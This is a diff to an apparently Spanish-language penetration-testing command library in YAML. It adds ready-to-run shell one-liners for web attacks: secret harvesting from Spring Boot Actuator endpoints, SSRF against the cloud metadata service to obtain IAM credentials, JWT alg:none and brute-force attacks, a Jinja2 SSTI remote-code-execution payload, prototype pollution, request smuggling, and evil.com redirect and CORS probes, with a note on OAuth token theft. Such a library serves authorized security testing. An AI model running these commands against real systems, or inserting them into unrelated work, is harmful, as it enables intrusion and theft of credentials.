@@ -239,3 +239,119 @@
         required: true
     tags: [web, burp, proxy, intercept]
     notes: "Burp activo en 127.0.0.1:8080. Instalar certificado CA en el browser."
+
+  # ─────────────────────────────────────────────
+  # MODERN WEB ATTACKS (2023-2024)
+  # ─────────────────────────────────────────────
+
+  - id: graphql_introspection
+    name: "GraphQL - Introspección + Enum"
+    description: "Descubre el schema completo de GraphQL via introspección"
+    command: "for path in /graphql /api/graphql /v1/graphql /graphiql /playground; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' 'http://{target}$path' 2>/dev/null); [ \"$CODE\" != '404' ] && echo \"GraphQL en $path: $CODE\" && curl -sk -X POST 'http://{target}$path' -H 'Content-Type: application/json' -d '{\"query\":\"{ __schema { types { name } } }\"}' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); types=[t[\"name\"] for t in d.get(\"data\",{}).get(\"__schema\",{}).get(\"types\",[])]; [print(t) for t in types if not t.startswith(\"__\")][:10]' 2>/dev/null; done"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10:3000"
+        required: true
+    tags: [graphql, introspection, api, web]
+    notes: "Si introspección activa → buscar mutaciones de auth, IDOR en queries, injection."
+
+  - id: spring_actuator_scan
+    name: "Spring Boot Actuator - Scan"
+    description: "Descubre endpoints de Spring Boot Actuator expuestos"
+    command: "for ep in actuator actuator/env actuator/beans actuator/heapdump actuator/mappings actuator/loggers actuator/info actuator/httptrace actuator/health; do CODE=$(curl -sk -o /dev/null -w '%{http_code}' 'http://{target}/$ep' 2>/dev/null); [ \"$CODE\" = '200' ] && echo \"EXPOSED: /$ep\" && curl -sk 'http://{target}/$ep' 2>/dev/null | python3 -c 'import sys,json; d=json.load(sys.stdin); [print(k,str(v)[:80]) for k,v in d.items() if any(s in str(k).lower() for s in [\"pass\",\"secret\",\"key\",\"token\",\"cred\",\"db\"])]' 2>/dev/null | head -5; done"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10:8080"
+        required: true
+    tags: [spring-boot, actuator, web, misconfiguration]
+    notes: "/actuator/env puede exponer DB_PASSWORD, API keys, etc. /actuator/heapdump para memory dump."
+
+  - id: cors_misconfiguration_check
+    name: "CORS Misconfiguration Check"
+    description: "Verifica si la app tiene configuración CORS insegura"
+    command: "curl -sk -H 'Origin: https://evil.com' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'; echo '---'; curl -sk -H 'Origin: null' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'; echo '---'; curl -sk -H 'Origin: https://{target}.evil.com' -I 'http://{target}' 2>/dev/null | grep -i 'access-control'"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [cors, web, misconfiguration, headers]
+    notes: "Si Access-Control-Allow-Origin: * + Allow-Credentials: true → crítico. Si refleja Origin evil.com → alto."
+
+  - id: jwt_tool_attacks
+    name: "JWT Tool - Bypass/Crack"
+    description: "Analiza y ataca tokens JWT (alg:none, RS→HS256, brute)"
+    command: "python3 /opt/jwt_tool/jwt_tool.py {jwt} -t 'http://{target}' -rh 'Authorization: Bearer JWTTOOL_TOKEN' -M at 2>/dev/null | head -20"
+    params:
+      - name: jwt
+        label: "JWT token"
+        placeholder: "eyJhbGciOiJIUzI1NiJ9..."
+        required: true
+      - name: target
+        label: "Target URL"
+        placeholder: "http://10.10.10.10"
+        required: true
+    tags: [jwt, bypass, brute, web]
+    notes: "Instalar: git clone https://github.com/ticarpi/jwt_tool. Opciones: -X a (alg:none), -X s (RS→HS256), -C -d rockyou.txt (brute)"
+
+  - id: open_redirect_check
+    name: "Open Redirect Check"
+    description: "Detecta open redirects en parámetros de URL comunes"
+    command: "for param in redirect next url return returnTo goto dest destination r redir; do LOC=$(curl -sk -o /dev/null -w '%{redirect_url}' 'http://{target}/?'$param'=https://evil.com' 2>/dev/null); echo \"$LOC\" | grep -q 'evil.com' && echo \"OPEN_REDIRECT: ?$param=https://evil.com → $LOC\"; done"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [open-redirect, web, owasp]
+    notes: "Usable para OAuth token stealing: redirect_uri=https://evil.com/callback en flujo OAuth."
+
+  - id: ssrf_cloud_metadata
+    name: "SSRF - Cloud Metadata Check"
+    description: "Verifica si hay SSRF via parámetros de URL apuntando al IMDS"
+    command: "for param in url redirect next fetch load proxy callback src image target uri; do R=$(curl -sk 'http://{target}/?'$param'=http://169.254.169.254/latest/meta-data/' 2>/dev/null | head -5); [ -n \"$R\" ] && echo \"SSRF POSSIBLE: ?$param=http://169.254.169.254\" && echo \"$R\" | head -3 && break; done"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [ssrf, cloud, aws, metadata, web]
+    notes: "Si responde → GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ para credenciales IAM."
+
+  - id: prototype_pollution_check
+    name: "Prototype Pollution Check"
+    description: "Detecta prototype pollution en apps Node.js"
+    command: "for payload in '__proto__[test]=polluted' 'constructor[prototype][test]=polluted' '__proto__.test=polluted'; do R=$(curl -sk -X POST 'http://{target}/api' -H 'Content-Type: application/json' -d '{\"'$payload'\": 1}' 2>/dev/null); echo \"Payload: $payload → $(echo $R | head -c 50)\"; done"
+    params:
+      - name: target
+        label: "Target IP:Port/Path"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [prototype-pollution, nodejs, javascript, web]
+    notes: "Si la respuesta cambia o da error 500 → posible prototype pollution. Verificar isAdmin bypass."
+
+  - id: ssti_payloads
+    name: "SSTI - Server Side Template Injection"
+    description: "Detecta y explota SSTI en frameworks comunes (Jinja2, Twig, FreeMarker)"
+    command: "for payload in '{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '*{7*7}'; do R=$(curl -sk 'http://{target}/?name='$(python3 -c 'import urllib.parse; print(urllib.parse.quote(\"'$payload'\"))') 2>/dev/null); echo \"$R\" | grep -q '49' && echo \"SSTI CONFIRMED: $payload\" && break; done; # RCE Jinja2\ncurl -sk \"http://{target}/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}\" 2>/dev/null | grep uid="
+    params:
+      - name: target
+        label: "Target IP:Port/Path"
+        placeholder: "10.10.10.10/search"
+        required: true
+    tags: [ssti, template-injection, rce, web, jinja2]
+    notes: "Si {{7*7}} → 49 = Jinja2/Twig. Para RCE Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+
+  - id: http_request_smuggling
+    name: "HTTP Request Smuggling Check"
+    description: "Detecta HTTP Request Smuggling (CL.TE y TE.CL)"
+    command: "# CL.TE check\ncurl -sk 'http://{target}/' -X POST -H 'Content-Length: 13' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nSMUGGLED' 2>/dev/null | head -5; # Use smuggler.py for full detection\npython3 /opt/smuggler/smuggler.py -u 'http://{target}/' 2>/dev/null | head -20 || echo 'Install smuggler: git clone https://github.com/defparam/smuggler'"
+    params:
+      - name: target
+        label: "Target IP:Port"
+        placeholder: "10.10.10.10"
+        required: true
+    tags: [http-smuggling, cl-te, te-cl, web, owasp]
+    notes: "Instalar smuggler: git clone https://github.com/defparam/smuggler. Muy impactante en apps detrás de proxy."
